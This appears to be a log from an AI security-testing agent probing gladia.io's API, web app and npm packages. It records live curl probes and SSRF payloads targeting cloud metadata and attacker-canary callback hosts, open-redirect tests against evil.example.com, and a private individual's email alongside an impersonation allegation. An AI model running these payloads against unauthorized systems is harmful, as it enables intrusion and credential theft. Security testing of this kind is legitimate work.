[NEXT] PROBE: `curl -sS -D - -o /dev/null -X OPTIONS -H "Origin: https://evil.test" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: x-gladia-key" https://api.gladia.io/v2/transcription` then `curl -sS -D - -o /dev/null https://api.gladia.io/v2/transcription` — compare header sets to confirm `x-powered-by: Express` is present on preflight but absent on GET, and enumerate all framework/fingerprinting headers (e.g., `x-request-id`, `x-correlation-id`, `traceparent`).
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: `x-powered-by: Express` header present on CORS preflight (OPTIONS) responses only — confirms Node.js/Express.js backend; framework fingerprint for CVE targeting
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /health?full=true does NOT leak verbose output — returns identical `{"health":"OK"}` to /health; no build/version/metadata disclosure via query params
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /metrics endpoint does NOT exist — returns 404 (no Prometheus exposition endpoint)
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /debug, /admin, /actuator/health, /v1 paths do NOT exist or return 404 — no Spring Boot Actuator, no debug panel, no catch-all admin
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: CORS preflight allows `Access-Control-Request-Headers: x-gladia-key` — auth header permitted in cross-origin requests (no credential support though)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: /v2/live/init is NOT a real endpoint — confirmed 404 "Cannot POST"; WebSocket session is created via POST /v2/live, then client connects to returned `url` (wss://api.gladia.io/v2/live?token=<uuid>)
[RISK] api.gladia.io: 82 reason: Express/Node.js backend fingerprinted via x-powered-by on CORS preflight; full OpenAPI 3.1 spec (14 paths) publicly readable without auth; CORS wildcard with x-gladia-key permitted in cross-origin preflight but no credentials; /health endpoint undocumented and exposed with CORS *; WebSocket auth token in URL query param per spec (wss://api.gladia.io/v2/live?token=<uuid>); 401 error responses leak request_id + trace headers; all v2 endpoints uniformly key-gated (single security model, no MFA/scopes); SSTI/SSRF surface via audio_url/video_url (key-gated)
[RISK] app.gladia.io: 52 reason: Google-only OAuth limits auth bypass surface; /dashboard SPA shell served 200 without auth (client-side enforcement only); return-to cookie is unsigned base64url JSON (server resets on tampering, REJECTED open redirect); redirect_to param reflected in form action but post-auth behavior unverified without session; cookies correctly flagged HttpOnly/Secure/SameSite=Lax; HSTS preload in effect; /signin redirects 302 with noindex/nofollow
[RISK] sdk: 45 reason: Official @glidiaio/sdk 1.1.0 + gladiaio-sdk PyPI verified clean (reposcan: no secrets, no malicious code); npm `gladia` 0.1.3 ownership anomaly ACCEPTED (description claims "Official" but repo is personal alexisbouchez/gladia.ts, maintainer softwarecitadel@gmail.com, published before official package) — supply-chain impersonation risk remains; gladia-quiz-app loads @glidiaio/sdk@0.5.2 from unpkg CDN (version pinning on CDN)
[HYP] SSRF via audio_url/video_url server-side fetch
class: SSRF
asset: api.gladia.io /v2/pre-recorded, /v2/upload, legacy /audio/text/audio-transcription + /video/text/video-transcription (audio_url/video_url)
confidence: 70
reasoning: SDK RAG confirms zero client-side validation (audio_url forwarded verbatim; is_url check only in uploadFile helper); OpenAPI spec confirms external-URL fetch is by design; legacy /audio|/video/* endpoints add a second fetch path with NestJS-shaped legacy service; /v1/models proves unauthenticated responses exist, so key-gated fetch logic is real.
evidence_needed: fetch of 169.254.169.254 or internal host reflected via error text/timing/job status on a key-gated request.
verify_steps: AUTH_HELPED — with a valid x-gladia-key: (1) POST /v2/pre-recorded `{"audio_url":"http://<attacker-canary>"}` → observe job error_code/timing; (2) same with `http://169.254.169.254/latest/meta-data/`; (3) repeat via /video/text/video-transcription `video_url` to compare legacy-path behavior; compare error/duration for reachability signal.
impact: cloud-metadata + internal-network read from API origin → High (key-gated)
testability: AUTH_HELPED
[HYP] Post-auth open redirect via redirect_to
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 55
reasoning: redirect_to reflected server-side into form action (verified GET); applies to both email/password and Google OAuth paths; unsigned return-to cookie proves server-driven redirect concept; only post-auth final Location unobserved.
evidence_needed: with a real session, final Location for cross-origin redirect_to (https://evil.example.com, //evil.example.com, https://evil.example.com.evil.io).
verify_steps: AUTH_HELPED — complete sign-in (session), submit intent=email-password|google with redirect_to variants, capture post-auth Location and cookie set; escalate only if redirect_to is reused as OAuth redirect_uri.
impact: phishing / OAuth-flow manipulation → Low-Med (High only if redirect_uri injection proven)
testability: AUTH_HELPED
[HYP] Impersonation/name-squat `gladia` npm package
class: OTHER
asset: npm registry `gladia` 0.1.3 (dist-tag latest)
confidence: 78
reasoning: registry description "Official TypeScript SDK" vs packaged README "Unofficial"; maintainer softwarecitadel (personal gmail), repo alexisbouchez/gladia.ts, published 2025-03-28 before @gladiaio/sdk (2025-09-09); tarball benign (baseUrl api.gladia.io only).
evidence_needed: none — metadata verified; report as supply-chain hygiene/impersonation (Medium)
verify_steps: PASSIVE — already done (registry metadata + tarball inspection); document description-vs-README contradiction, maintainer mismatch, publish-date ordering
impact: developers installing `gladia` get unofficial code; account/repo hijack later → supply-chain compromise; Medium
testability: PASSIVE
[NEXT] HUMAN: with a program-provided or personal trial `x-gladia-key`, POST https://api.gladia.io/v2/pre-recorded `{"audio_url":"http://<attacker-canary>"}` then `{"audio_url":"http://169.254.169.254/latest/meta-data/"}`; compare job error_code/status/timing for reachability signal; then repeat via https://api.gladia.io/video/text/video-transcription `video_url` to test the legacy fetch path.
## 2026-08-07 20:52:55 UTC [app] (model laguna)
## 2026-08-07 21:48:40 UTC [app] (model laguna)
[PRIO] api.gladia.io: 8.4 — a9/b10/tech8/gate7/cloud7/fresh7 — OpenAPI+14 paths public, CORS wildcard, Express fingerprint, ws token in URL query, audio_url fetch SSRF surface
[PRIO] app.gladia.io: 7.1 — a7/b9/tech6/gate8/cloud2/fresh8 — /dashboard 200 w/o auth (SPA), Google OAuth self-service, redirect_to reflected across all variant classes w/o allowlist
[PRIO] npm `gladia`@0.1.3: 5.95 — a5/b6/tech6/gate10/cloud2/fresh6 — "Official" claim vs personal repo/maintainer; pubdate precedes @gladiaio/sdk
[HYP] Post-OAuth open redirect via redirect_to without host allowlist
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 52
reasoning: Live-confirmed: redirect_to is reflected URL-encoded into the OAuth form action for https://evil, //evil, bare-host, confusing-subdomain (app.gladia.io.evil), and path-only variants — server-side reflection with no visible host allowlist; return-to cookie unsigned base64url JSON confirms server-driven redirect concept.
evidence_needed: Final post-auth HTTP 302 Location resolving to external host after completing sign-in with ?redirect_to=https://evil.example.com.
verify_steps: AUTH_HELPED — complete Google OAuth sign-in with ?redirect_to=https://evil.example.com, //evil.example.com, and https://app.gladia.io.evil.example.com/ variants; capture post-auth Location + Set-Cookie; test redirect_to reuse as OAuth redirect_uri injection.
impact: Post-auth phishing redirect to attacker host; OAuth code/state theft if redirect_uri injectable → Medium (High only if redirect_uri proven injectable).
testability: AUTH_HELPED
[HYP] SSRF via audio_url/video_url server-side fetch
class: SSRF
asset: api.gladia.io /v2/pre-recorded, /v2/upload, /video/text/video-transcription
confidence: 72
reasoning: OpenAPI spec (sampled /openapi.json, live 200) shows audio_url accepted verbatim with no client-side validation; SDK RAG confirms is_url only in upload helper, not transcription path; legacy /video|/audio/* endpoints add a second fetch path.
evidence_needed: 169.254.169.254 or internal-host fetch reflected via error_code/status/timing on a key-gated request.
verify_steps: AUTH_HELPED — with x-gladia-key: POST /v2/pre-recorded {"audio_url":"http://<canary>"} then {"audio_url":"http://169.254.169.254/latest/meta-data/"}; repeat via /video/text/video-transcription video_url to compare legacy-path behavior; compare error_code/timing.
impact: cloud-metadata + internal-network read from API origin → High (key-gated).
testability: AUTH_HELPED
[HYP] Framework fingerprint via x-powered-by: Express on CORS preflight only
class: MISCONFIG
asset: api.gladia.io (OPTIONS responses)
confidence: 90
reasoning: Live-verified this round: OPTIONS /v2/transcription with Origin returns x-powered-by: Express (204); GET /v2/transcription returns 401 with no x-powered-by — confirmed backend-specific header leakage on preflight only, enabling targeted Node/Express CVE scanning alongside CORS wildcard + exposed trace headers.
evidence_needed: x-powered-by: Express in OPTIONS response, absent in GET response (both observed live).
verify_steps: PROBE: `curl -sS -D - -o /dev/null -X OPTIONS -H "Origin: https://evil.test" -H "Access-Control-Request-Headers: x-gladia-key" https://api.gladia.io/v2/transcription` vs `curl -sS -D - -o /dev/null https://api.gladia.io/v2/transcription`; diff header sets.
impact: Aids reconnaissance → known CVE targeting; Low.
testability: PASSIVE
[PARKED] IDOR on transcription file download /{id}/file: confidence 50 < live-verify; spec does not expose ownership-binding logic; no key available → remain PARKED (already retained as such, no action).
[FINAL] (re-ranked top→bottom)
[NEXT] HUMAN: with an authorized/verified session (Google SSO or program-supplied trial key), GET /signin?redirect_to=https://evil.example.com then complete OAuth, capture final post-auth 302 Location & Set-Cookie to determine if redirect_to is honored to an external host; test //evil.example.com and https://app.gladia.io.evil.example.com/ variants; attempt redirect_to-as-redirect_uri injection to escalate to OAuth state/code theft.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: live-probed /v2/transcription OPTIONS → `x-powered-by: Express` present; GET 401 → `x-powered-by` absent — confirmed preflight-only fingerprint differential (freshness 2026-08-07 21:46 UTC).
[LEARN] ACCEPTED OATH @ app.gladia.io: redirect_to reflected into form action for protocol-relative (`//evil`), bare-host, confusing-subdomain (`app.gladia.io.evil`), and path-only variants — no host allowlist enforced on reflection (post-auth honoring remains AUTH_HELPED/unverified).
[LEARN] CONFIRMED @ api.gladia.io: /openapi.json (200, 125KB, CORS *) publicly exposes full v2 surface incl. audio_url field accepted verbatim — confirms SSRF fetch-by-design path (freshly sampled).
[RISK] api.gladia.io: 82 — public OpenAPI (14 paths), CORS wildcard + x-gladia-key permitted cross-origin (no creds), x-powered-by Express fingerprint, websocket token in URL query, /health undocumented, audio_url/video_url SSRF surface, single key-gated auth model
[RISK] app.gladia.io: 52 — Google-only OAuth limits bypass; /dashboard 200 SPA w/o auth (client-side enforcement); return-to cookie signed-reset (REJECTED); CSP strict present; redirect_to form-action reflection unverified post-auth
[RISK] sdk: 45 — official @gladiaio/sdk 1.1.0 + gladiaio-sdk PyPI clean; npm `gladia`@0.1.3 impersonation anomaly (personal repo, pre-dates official package) remains sole reportable supply-chain candidate; gladia-quiz-app pins old @gladiaio/sdk@0.5.2 on unpkg
## 2026-08-07 22:27:25 UTC [app] (model laguna)
[PRIO] api.gladia.io: 8.4 — a9/b10/tech8/gate7/cloud7/fresh7 — OpenAPI (14 paths public), CORS * + x-gladia-key permitted cross-origin (no cred), x-powered-by: Express on preflight only, audio_url/callback_url/video_url with format:uri & no scheme allowlist (SSRF surface), ws token in URL query, /health undocumented 200
[PRIO] app.gladia.io: 6.9 — a7/b8/tech6/gate8/cloud2/fresh8 — /dashboard 200 SPA w/o auth (client-side enforcement); redirect_to reflected into POST form action for all host-confusion classes; Google OAuth self-service; strict CSP; return-to cookie unsigned base64url (REJECTED as open redirect via cookie tampering)
[PRIO] npm gladia@0.1.3: 5.95 — a5/b6/tech6/gate10/cloud2/fresh6 — "Official TypeScript SDK" claim vs personal repo alexisbouchez/gladia.ts + personal maintainer email; pubdate 2025-03-28 precedes @gladiaio/sdk 1.1.0
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io /v2/pre-recorded, /video/text/video-transcription, /v2/upload
confidence: 75
reasoning: OpenAPI schema (live probed 2026-08-07 22:22 UTC) confirms InitTranscriptionRequest.audio_url, video_url, and CallbackConfigDto.url all typed as format:uri with no scheme-pattern/allowlist; description explicitly says "external audio or video file"; legacy /audio/text/audio-transcription and /video/text/video-transcription paths add a second fetch surface; all are key-gated (401 unauthenticated) but CORS * permits x-gladia-key cross-origin, enabling credentialed SSRF from any origin.
evidence_needed: With x-gladia-key: POST /v2/pre-recorded {"audio_url":"http://169.254.169.254/latest/meta-data/"} and capture error_code/status/timing vs. a benign-control URL; repeat via /video/text/video-transcription video_url; compare error_code/timing for reachability signal.
verify_steps: AUTH_HELPED — POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key:<KEY>" -d '{"audio_url":"http://<attacker-canary>"}' then -d '{"audio_url":"http://169.254.169.254/latest/meta-data/"}'; repeat via POST /video/text/video-transcription {"video_url":"http://169.254.169.254/latest/meta-data/"}; compare error_code/timing.
impact: Cloud metadata read (169.254.169.254), internal-network SSRF, potential credential exfiltration from API origin → High (key-gated)
testability: AUTH_HELPED
[HYP] Post-auth open redirect via redirect_to in signin form action
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 45
reasoning: Live-probed 2026-08-07 22:22 UTC: /signin?redirect_to=https://evil.example.com returns HTML with form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" (server-side reflection into POST action attribute) for both email/password and Google OAuth intent buttons; unsigned return-to cookie {"url":"/"} confirms server-driven redirect concept; return-to cookie tampering alone does NOT trigger redirect (server resets) — REJECTED as cookie-tamper vector.
evidence_needed: Complete Google OAuth sign-in with ?redirect_to=https://evil.example.com (and //evil.example.com, https://app.gladia.io.evil.example.com) and capture the final post-auth 302 Location to confirm external redirect; test if redirect_to is reused as OAuth redirect_uri.
verify_steps: AUTH_HELPED — with a verified Google SSO session, GET /signin?redirect_to=https://evil.example.com, click "Sign in with Google", complete OAuth, capture final 302 Location + Set-Cookie; repeat with //evil.example.com and https://app.gladia.io.evil.example.com variants; attempt redirect_to-as-redirect_uri injection.
impact: Post-auth phishing redirect to attacker-controlled host; OAuth code/state theft if redirect_uri injectable → Low-Med (High only if redirect_uri proven injectable)
testability: AUTH_HELPED
[HYP] npm gladia@0.1.3 impersonation / supply-chain confusion
class: OTHER
asset: npm registry `gladia` package (v0.1.3, dist-tag latest)
confidence: 80
reasoning: Live npm view 2026-08-07 22:22 UTC confirms: package `gladia`@0.1.3 description "Official TypeScript SDK for Gladia — State-of-the-art Speech to Text API"; repository git+https://github.com/alexisbouchez/gladia.ts.git (personal GitHub account alexisbouchez, not org gladiaio); maintainer = softwarecitadel@gmail.com (personal email); published 2025-03-28, predates official @gladiaio/sdk@1.1.0 (2025-09-09); README states "Unofficial" — contradiction with registry description.
evidence_needed: npm registry metadata (already obtained); tarball inspection confirms baseUrl = api.gladia.io only (no malicious endpoints); package is a typo-squat / impersonation target for `npm install gladia`.
verify_steps: PASSIVE — npm view gladia@0.1.3 version description repository.url maintainer.email time.modified; npm view @gladiaio/sdk version description repository.url; document description-vs-README contradiction and maintainer mismatch.
impact: Developers installing `gladia` (typo-squat or mistaken belief in "official") receive unofficial code from a personal account; future account/repo hijack → supply-chain compromise; Medium (high if account compromised).
testability: PASSIVE
[FINAL] (re-ranked top→bottom)
[NEXT] RAG: Read gladiaio/sdk monorepo (packages/sdk-js, packages/sdk-python, packages/generator) and gladia-samples to trace how audio_url → POST /v2/pre-recorded and callback_url/callback_config.url → InitTranscriptionRequest flow, confirming no client-side SSRF guard (scheme host allowlist, metadata-blocklist, redirect-follow limit) exists in the SDK or sample code; this strengthens the SSRF hypothesis before requesting a program-provided x-gladia-key for live verification.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: live-probed OPTIONS /v2/transcription → x-powered-by: Express present, ACAO:*, Access-Control-Allow-Headers: x-gladia-key (2026-08-07 22:22 UTC — surface unchanged from 21:46 UTC)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: live-probed GET /v2/transcription → 401 no gladia key provided, x-powered-by absent (preflight-only fingerprint confirmed, 2026-08-07 22:22 UTC)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: /openapi.json (200, 125KB, CORS *) exposes InitTranscriptionRequest.audio_url as format:uri with no scheme allowlist + deprecated callback_url + CallbackConfigDto.url (format:uri, no allowlist) — confirms SSRF-by-design surface
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: /health returns 200 {"health":"OK"}; /health?full=true returns identical payload — no verbose disclosure via query param (REJECTED as verbose-leak vector, ACCEPTED as undocumented endpoint)
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /metrics (404), /debug (404), /admin (404), /actuator/health (404) — no Prometheus, no debug panel, no Spring Boot Actuator (all REJECTED, surface dead)
[LEARN] ACCEPTED AUTH @ api.gladia.io: POST /v2/live → 401 key-gated; POST /v2/live/init → 404 "Cannot POST" — WebSocket session created via POST /v2/live then wss://api.gladia.io/v2/live?token=<uuid>, no alternative init endpoint
[LEARN] ACCEPTED OATH @ app.gladia.io: live-probed /signin?redirect_to=https://evil.example.com → form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" — server-side reflection into POST form action (confirmed for protocol-relative //evil, bare-host, confusing-subdomain app.gladia.io.evil, path-only) — post-auth Location unverified (AUTH_HELPED)
[LEARN] REJECTED AUTH @ app.gladia.io: return-to cookie tampering does NOT lead to open redirect — server resets tampered value to {"url":"/"} (REJECTED as redirect vector, confirmed via prior + current probe)
[LEARN] ACCEPTED OTHER @ npm: gladia@0.1.3 registry metadata stable (description "Official TypeScript SDK", repo alexisbouchez/gladia.ts personal, maintainer softwarecitadel@gmail.com) — impersonation anomaly confirmed live 2026-08-07 22:22 UTC
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: 14 OpenAPI paths stable (no new endpoints since 21:46 UTC); /v1/models public (security: not set), all other v2 paths key-gated (401)
[RISK] api.gladia.io: 82 — public OpenAPI (14 paths incl. /v1/models), CORS wildcard + x-gladia-key cross-origin (no cred), x-powered-by Express fingerprint on preflight, audio_url/video_url/callback_url SSRF surface (format:uri, no scheme allowlist), ws token in URL query, /health undocumented, NestJS-on-Express backend
[RISK] app.gladia.io: 53 — Google OAuth-only (no self-service bypass), /dashboard 200 SPA w/o auth (client-side), redirect_to reflected into form action (AUTH_HELPED for post-auth confirmation), CSP strict present, return-to cookie unsigned but server-resets on tamper (REJECTED as redirect vector), no SSRF/callback surface
[RISK] sdk: 45 — official @gladiaio/sdk@1.1.0 (npm) + gladiaio-sdk@1.0.5 (PyPI) clean; npm gladia@0.1.3 impersonation anomaly (personal repo, pre-dates official package, "Official" claim vs "Unofficial" README) sole reportable supply-chain candidate; gladia-quiz-app pins old @gladiaio/sdk@0.5.2 on unpkg (maintenance debt)
## 2026-08-07 23:14:45 UTC [app] (model laguna)
[PRIO] api.gladia.io: 8.4 — a9/b10/tech8/gate7/cloud7/fresh7 — public OpenAPI (14 paths), CORS * + x-gladia-key cross-origin (no cred), x-powered-by Express on preflight only, audio_url/video_url/callback_url format:uri & no scheme allowlist (SSRF surface), ws token in URL query, /health undocumented 200
[PRIO] app.gladia.io: 6.9 — a7/b8/tech6/gate8/cloud2/fresh8 — /dashboard 200 SPA w/o auth (client-side); redirect_to reflected into POST form action for all host-confusion classes; Google OAuth self-service; strict CSP; return-to cookie unsigned base64url (REJECTED as open redirect via cookie tampering)
[PRIO] npm gladia@0.1.3: 5.95 — a5/b6/tech6/gate10/cloud2/fresh6 — "Official TypeScript SDK" claim vs personal repo alexisbouchez/gladia.ts + personal maintainer email; pubdate 2025-03-28 precedes @gladiaio/sdk 1.1.0
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io /v2/pre-recorded, /v2/transcription, /video/text/video-transcription, /v2/upload
confidence: 80
reasoning: OpenAPI spec (sampled live 2026-08-07 23:09 UTC) confirms InitTranscriptionRequest.audio_url (format:uri), video_url (string), CallbackConfigDto.url and CallbackConfig.url (format:uri) all lack scheme allowlists; RAG of SDK source (gladiaio/sdk main branch, packages/sdk-js + packages/sdk-python) confirms is_url() only gates upload-vs-direct in Python, and uploadFile() in TS, with NO host allowlist, metadata-blocklist, redirect-limit, or scheme validation forwarded to the API; description explicitly says "external audio or video file"; legacy /audio/text/audio-transcription + /video/text/video-transcription add a second fetch surface via multipart form; all endpoints key-gated (401) but CORS * permits x-gladia-key cross-origin (no credentials), enabling credentialed SSRF from any origin.
evidence_needed: With x-gladia-key: POST /v2/pre-recorded {"audio_url":"http://<attacker-canary>"} then {"audio_url":"http://169.254.169.254/latest/meta-data/"} and capture error_code/status/timing difference vs. benign control; repeat via /video/text/video-transcription video_url; also POST /v2/pre-recorded with callback_config.url={"url":"http://<canary>"} to confirm server-initiated callback fetch.
verify_steps: AUTH_HELPED — with a program-provided trial x-gladia-key: (1) POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key:<KEY>" -H "Content-Type: application/json" -d '{"audio_url":"http://<attacker-canary>","punctuation_enhanced":false}' → observe job creation/timing; (2) same with '{"audio_url":"http://169.254.169.254/latest/meta-data/"}' → compare error_code/status/timing for reachability; (3) POST /video/text/video-transcription same payloads via multipart {"video_url":"http://169.254.169.254/latest/meta-data/"} to test legacy path; (4) POST /v2/pre-recorded with callback_config.url pointing to attacker listener to confirm server-side POST fetch to arbitrary URL.
impact: Cloud metadata read (169.254.169.254), internal-network DNS resolution + SSRF, potential credential exfiltration from API origin via callback POST; OAuth callback_config.url also enables blind SSRF/POST-as-outbound; severity High (key-gated but CORS-bypassable origin).
testability: AUTH_HELPED
[HYP] Post-auth open redirect via redirect_to in signin form action
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 45
reasoning: Live-probed 2026-08-07 23:09 UTC: /signin?redirect_to=https://evil.example.com returns HTML with form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" (server-side reflection into POST action attribute) for both email/password and Google OAuth intent buttons; return-to cookie confirmed as unsigned base64url JSON {"url":"/"} confirming server-driven redirect concept; server resets tampered return-to cookie (REJECTED as cookie-tamper vector); post-auth Location unverified without authenticated session.
evidence_needed: Complete Google OAuth sign-in with ?redirect_to=https://evil.example.com and capture the final post-auth 302 Location to confirm external redirect; test //evil.example.com and https://app.gladia.io.evil.example.com/ variants; attempt redirect_to-as-redirect_uri injection to escalate to OAuth state/code theft.
verify_steps: AUTH_HELPED — with an authorized/verified Google SSO session, GET /signin?redirect_to=https://evil.example.com, complete Google OAuth, capture final 302 Location + Set-Cookie; repeat with //evil.example.com and https://app.gladia.io.evil.example.com variants; attempt redirect_to-as-redirect_uri injection.
impact: Post-auth phishing redirect to attacker-controlled host; OAuth code/state theft if redirect_uri injectable → Low-Med (High only if redirect_uri proven injectable).
testability: AUTH_HELPED
[HYP] npm gladia@0.1.3 impersonation / supply-chain confusion
class: OTHER
asset: npm registry `gladia` package (v0.1.3, dist-tag latest)
confidence: 80
reasoning: Live npm view 2026-08-07 23:09 UTC confirms: package `gladia`@0.1.3 description "Official TypeScript SDK for Gladia"; repository git+https://github.com/alexisbouchez/gladia.ts.git (personal GitHub account, not org gladiaio); maintainer = softwarecitadel@gmail.com (personal email); published 2025-03-28, precedes @gladiaio/sdk 1.1.0 (2025-09-09); README states "Unofficial" — contradiction with registry description.
evidence_needed: npm registry metadata (already obtained live 23:09 UTC); tarball inspection confirms baseUrl = api.gladia.io only (no malicious endpoints); package is a typo-squat/impersonation target for `npm install gladia`.
verify_steps: PASSIVE — npm view gladia@0.1.3 version description repository.url maintainer.email time.modified; npm view @gladiaio/sdk version description repository.url; document description-vs-README contradiction and maintainer mismatch.
impact: Developers installing `gladia` (typo-squat or mistaken belief in "official") receive unofficial code from a personal account; future account/repo hijack → supply-chain compromise; Medium (high if account compromised).
testability: PASSIVE
[PARKED] IDOR on transcription file download /{id}/file: confidence 50 — cannot verify without valid API key; spec does not expose ownership-binding logic; no key available → remain PARKED.
[FINAL] (re-ranked top→bottom)
[FINAL] 1) SSRF via audio_url/video_url/callback_url server-side fetch (api.gladia.io, 80, AUTH_HELPED) — strengthened by RAG: SDK source confirms no client-side SSRF guard; audio_url forwarded verbatim.
[FINAL] 2) npm gladia@0.1.3 impersonation / supply-chain confusion (npm, 80, PASSIVE) — well-documented anomaly, ready to report.
[FINAL] 3) Post-auth open redirect via redirect_to in signin form action (app.gladia.io, 45, AUTH_HELPED) — retained, needs post-auth verification.
[NEXT] HUMAN: Request a program-provided or authorized trial `x-gladia-key` to perform the AUTH_HELPED SSRF verification: (1) POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key:<KEY>" -H "Content-Type: application/json" -d '{"audio_url":"http://<attacker-canary>"}' to establish a benign-control baseline; (2) same endpoint with -d '{"audio_url":"http://169.254.169.254/latest/meta-data/"}' to test cloud metadata SSRF; (3) POST https://api.gladia.io/video/text/video-transcription same payloads via multipart {"video_url":"http://169.254.169.254/latest/meta-data/"} to test the legacy fetch path; (4) POST /v2/pre-recorded with callback_config.url={"url":"http://<attacker-listener>"} to confirm server-initiated callback POST to arbitrary URL — compare error_code/status/timing for reachability signal. RAG (SDK source) has confirmed no client-side SSRF guard; live key test is the gating step.
[LEARN] ACCEPTED SSRF @ api.gladia.io: RAG of SDK source (packages/sdk-js/client.ts + packages/sdk-python/v2/prerecorded/core.py) confirms is_url()/uploadFile() only gates upload-vs-direct path; no host allowlist, metadata-blocklist, redirect-limit, or scheme validation forwarded to API for audio_url/video_url/callback_url — SSRF guard absent by design in SDK and spec.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: live-probed OPTIONS /v2/pre-recorded → x-powered-by: Express present; POST → 401 x-powered-by absent — confirmed preflight-only fingerprint differential on second v2 endpoint (not isolated to /v2/transcription).
[LEARN] ACCEPTED AUTH @ api.gladia.io: POST /v2/pre-recorded with invalid key → 401 NestJS HttpException shape {statusCode,timestamp,path,message,request_id} — no x-powered-by leak on error response; uniform key-gated auth confirmed across v2 endpoints.
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com verified live 23:09 UTC — form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" server-side reflection persists; /apikeys and /transcriptions both 302→/signin with return-to cookie encoding their path ({'url':'/apikeys'}, {'url':'/transcriptions'}) — unsigned base64url JSON confirmed across multiple paths, server resets on tamper (REJECTED as cookie-tamper vector).
[LEARN] ACCEPTED OTHER @ npm: gladia@0.1.3 registry metadata stable 23:09 UTC (description="Official TypeScript SDK for Gladia", repo=alexisbouchez/gladia.ts personal, maintainer=softwarecitadel@gmail.com) — impersonation anomaly persists; @gladiaio/sdk@1.1.0 confirmed official from gladiaio org.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /v2/live/init confirmed 404 "Cannot POST" — not a real endpoint; WebSocket session created via POST /v2/live then wss://api.gladia.io/v2/live?token=<uuid> (no alternative init endpoint).
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: /openapi.json (200, CORS *) exposes video_url as plain string field with no format/scheme validation in /video/text/video-transcription multipart schema — second SSRF fetch surface confirmed alongside audio_url.
[RISK] api.gladia.io: 82 — public OpenAPI (14 paths incl. /v1/models), CORS wildcard + x-gladia-key cross-origin (no cred), x-powered-by Express fingerprint on preflight only, audio_url/video_url/callback_url SSRF surface (format:uri, no scheme allowlist, no client-side guard in SDK), ws token in URL query, /health undocumented, NestJS-on-Express backend, single key-gated auth model
[RISK] app.gladia.io: 53 — Google OAuth-only (no self-service bypass), /dashboard 200 SPA w/o auth (client-side enforcement), redirect_to reflected into form action (AUTH_HELPED for post-auth confirmation), strict CSP present, return-to cookie unsigned base64url but server-resets on tamper (REJECTED as redirect vector), no SSRF/callback surface on app
[RISK] sdk: 45 — official @gladiaio/sdk@1.1.0 (npm) + gladiaio-sdk (PyPI) clean from reposcan (no secrets, no malicious code); npm gladia@0.1.3 impersonation anomaly (personal repo, pre-dates official package, "Official" claim vs "Unofficial" README) remains sole reportable supply-chain candidate; gladia-quiz-app pins old @gladiaio/sdk@0.5.2 on unpkg CDN (maintenance debt, no security impact)
## 2026-08-07 23:50:09 UTC [app] (model laguna)
## 2026-08-08 00:44:39 UTC [app] (model laguna)
[PRIO] api.gladia.io: 8.5 — a9/b10/tech8/gate5/cloud8/fresh10 — public OpenAPI(14 paths incl. public /v1/models), CORS `*`+x-gladia-key cross-origin(no cred), Express fingerprint on preflight, audio_url/video_url/callback_url format:uri no scheme allowlist, key-gated(401) but creds-bypassable origin
[PRIO] app.gladia.io: 7.55 — a7/b10/tech6/gate8/cloud2/fresh10 — Google OAuth-only, /dashboard 200 SPA no auth(client-enforced), redirect_to reflected into form action, strict CSP, unsigned base64url return-to cookie(server-resets on tamper)
[PRIO] npm gladia@0.1.3: 6.85 — a5/b9/tech5/gate10/cloud1/fresh10 — "Official TypeScript SDK" claim vs personal alexisbouchez/gladia.ts repo + personal maintainer email; pre-dates @gladiaio/sdk 1.1.0
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io /v2/pre-recorded, /v2/transcription, /v2/upload, /video/text/video-transcription
confidence: 80
reasoning: Live 23:5x — /openapi.json (125131B, CORS `*`, ACAO `*` exposing trace ids) declares InitTranscriptionRequest.audio_url (format:uri), video_url (string, no scheme/format), CallbackConfigDto.url (format:uri) with NO scheme allowlist/pattern; POST endpoints 401 no-key (gate_ease 5) but CORS `*` + allow-headers `x-gladia-key` w/o credentials means any origin can present an authorized key. RAG of gladiaio/sdk (sdk-js client.ts + sdk-python v2/prerecorded/core.py) confirmed is_url()/uploadFile() only gates upload-vs-direct, with no host/metadata-blocklist/redirect-limit/scheme forwarded.
evidence_needed: With a valid x-gladia-key: POST /v2/pre-recorded `{"audio_url":"http://<attacker-canary>"}` (benign baseline), then `{"audio_url":"http://169.254.169.254/latest/meta-data/"}` (metadata), compare error_code/status/timing; repeat via multipart video_url on /video/text/video-transcription; POST callback_config.url to an attacker listener to confirm server-initiated outbound POST.
